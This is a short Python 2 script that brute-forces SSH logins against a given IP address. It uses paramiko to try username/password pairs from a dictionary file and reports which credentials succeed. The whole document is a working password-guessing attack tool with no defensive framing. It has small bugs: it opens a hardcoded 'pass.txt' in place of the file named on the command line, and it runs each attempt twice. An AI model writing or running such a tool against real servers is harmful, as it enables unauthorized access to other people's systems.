
import paramiko, sys, time, threading


if len(sys.argv) < 3:
    print "Usage: %s IP /path/to/dictionary" % (str(sys.argv[0]))
    print "Example: %s 192.168.150.1 dict.txt" % (str(sys.argv[0]))
    print "Dictionary should be in user pass format"
    sys.exit(1)

ip=sys.argv[1]
filename=sys.argv[2]

fd = open("pass.txt", "r")

def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        print IP + ' [-] %s:%s fail!' % (UserName, Password)
    else:
        print IP + '[!] %s:%s is CORRECT!' % (UserName, Password)
        ssh.close()
        return
print '[+] Bruteforcing against %s with dictionary %s' % (ip, filename)
for line in fd.readlines():
    username, password = line.strip().split(" ")
    attempt(ip,username,password)
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()
    time.sleep(.4)

fd.close()
sys.exit(0)

